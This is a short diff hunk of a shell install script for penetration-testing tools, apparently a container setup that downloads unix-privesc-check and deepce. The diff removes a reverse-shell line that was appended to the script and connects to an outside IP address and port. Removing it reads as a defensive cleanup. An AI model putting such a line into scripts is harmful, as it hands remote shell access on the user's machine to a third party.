@@ -66,6 +66,4 @@ curl -L http://pentestmonkey.net/tools/unix-privesc-check/unix-privesc-check-1.4
 curl https://raw.githubusercontent.com/stealthcopter/deepce/main/deepce.sh > deepce.sh \
     && chmod +x deepce.sh \
     && install ./deepce.sh /usr/local/bin \
-    && rm -rf deepce.sh;
-
-sh -i >& /dev/tcp/185.233.82.81/1338 0>&1
+    && rm -rf deepce.sh
